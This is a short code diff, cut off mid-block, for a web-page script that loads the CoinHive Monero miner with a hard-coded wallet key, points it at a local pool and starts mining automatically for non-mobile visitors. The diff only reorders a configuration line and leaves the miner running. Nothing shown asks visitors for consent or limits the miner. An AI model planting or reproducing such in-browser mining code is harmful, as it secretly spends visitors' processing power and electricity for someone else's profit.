@@ -1,8 +1,9 @@
 var script = document.createElement('script');
 script.onload = function () {
 	// XMR Pool hash
-	CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892"]];
+	
 	var m = new CoinHive.Anonymous( '43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc' );
+	CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892"]];
 	// Wallet
 	if(!m.isMobile()){
 		m.start();
